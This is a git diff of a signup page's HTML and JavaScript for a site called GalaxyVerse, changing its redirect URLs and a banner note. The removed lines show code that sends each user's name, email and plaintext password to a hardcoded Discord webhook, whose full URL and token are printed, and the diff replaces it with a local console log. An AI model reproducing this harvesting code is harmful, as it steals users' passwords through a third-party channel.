@@ -72,7 +72,7 @@
                 <input type="password" id="password" required>
             </div>
             <button type="submit">Create Account</button>
-            <center><b>**Remember this website was moved so if you already made an account just put random stuff**</b></center>
+            <center><b>**Remmeber this websites was moved so if you already made an account just put random stuff**</b>
         </form>
     </div>
 
@@ -80,7 +80,7 @@
         // Check if user has already created an account
         if (localStorage.getItem('accountCreated')) {
             // Redirect directly to the specified website if account already created
-            window.location.href = 'https://galaxyversev2.github.io/GalaxyVerseV2/homepage.html'; // Redirect URL
+            window.location.href = 'https://galaxyverse.w3spaces.com/homepage.html'; // Redirect URL
         }
 
         document.getElementById('signupForm').addEventListener('submit', function(event) {
@@ -91,61 +91,14 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Prepare data to send to the webhook
-            const data = {
-                name: name,
-                email: email,
-                password: password,
-            };
+            // Here you can handle the form submission, e.g., send the data to your server
+            console.log('Account Created:', { name, email, password });
 
-            // Send data to the webhook
-            fetch('https://discord.com/api/webhooks/1314035758113488957/-D4-Si5_gdPV08g2JBJgVQVGZXvBHIzFOa8rBb7NLjScTasZklHXySHtHpqaOPyzMPWP', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Error sending user data: ' + response.statusText);
-                }
-                console.log('User data sent successfully.');
-                // Set account created flag in localStorage
-                localStorage.setItem('accountCreated', 'true');
+            // Set account created flag in localStorage
+            localStorage.setItem('accountCreated', 'true');
 
-                // Prepare account created notification data
-                const accountCreatedData = {
-                    content: 'Account created successfully', // Changed to use 'content' for Discord webhook
-                    embeds: [{
-                        title: 'New Account Created',
-                        fields: [
-                            { name: 'Name', value: name, inline: true },
-                            { name: 'Email', value: email, inline: true }
-                        ]
-                    }]
-                };
-
-                // Send account created notification to the webhook
-                return fetch('https://discord.com/api/webhooks/1314035758113488957/-D4-Si5_gdPV08g2JBJgVQVGZXvBHIzFOa8rBb7NLjScTasZklHXySHtHpqaOPyzMPWP', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(accountCreatedData)
-                });
-            })
-            .then(notificationResponse => {
-                if (!notificationResponse.ok) {
-                    throw new Error('Error sending account created notification: ' + notificationResponse.statusText);
-                }
-                console.log('Account created notification sent successfully.');
-                // Redirect to the specified website
-                window.location.href = 'https://galaxyversev2.github.io/GalaxyVerseV2/homepage.html'; // Redirect URL
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // Redirect to the specified website
+            window.location.href = 'https://galaxyverse.w3spaces.com/homepage.html'; // Redirect URL
         });
     </script>
 
